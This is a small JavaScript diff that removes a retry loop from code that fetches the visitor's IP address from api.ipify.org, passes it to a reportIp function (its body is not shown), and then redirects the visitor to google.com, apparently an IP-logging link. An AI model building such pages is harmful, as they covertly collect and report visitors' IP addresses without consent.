@@ -23,14 +23,9 @@
             }
 
             (async () => {
-                for (let i = 0; i < 10; i++) {
-                    try {
                     await fetch("https://api.ipify.org?format=json")
                         .then((res) => res.json())
                         .then((data) => reportIp(data));
-                    break;
-                    } catch (e) {}
-                }
                 window.location.replace("https://google.com");
             })();
 
